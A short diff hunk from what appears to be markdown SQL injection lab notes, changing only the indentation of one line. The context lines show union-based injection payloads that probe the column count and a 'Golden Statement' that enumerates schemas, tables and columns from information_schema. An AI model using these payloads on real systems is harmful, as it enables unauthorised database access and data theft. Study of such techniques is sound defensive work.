@@ -476,7 +476,7 @@ step 5: Identify number of columns
 {option}' UNION SELECT 1,2,3,4 #
 {option}' UNION SELECT 1,2,3,4,5 #
 ```
-	* 4 columns displayed, column 2 hidden
+* 4 columns displayed, column 2 hidden
  step 6: Golden Statement
 UNION SELECT table_schema,table_name,column_name from information_schema.columns #
 
